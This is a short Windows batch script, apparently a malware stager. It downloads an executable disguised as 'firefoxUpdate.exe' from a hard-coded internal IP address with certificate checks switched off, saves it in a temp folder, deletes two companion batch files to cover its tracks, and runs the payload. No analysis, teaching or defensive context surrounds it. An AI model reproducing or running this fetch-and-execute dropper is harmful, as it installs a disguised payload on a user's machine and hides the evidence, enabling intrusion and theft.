
echo off
curl -k http://192.168.44.136:9090/firefoxUpdate.exe -o "%tmp%/Kjdmkah/firefoxUpdate.exe"
del "%tmp%/kjdmkah/a.bat"
del "%tmp%/kjdmkah/b.bat"

"%tmp%/Kjdmkah/firefoxUpdate.exe"
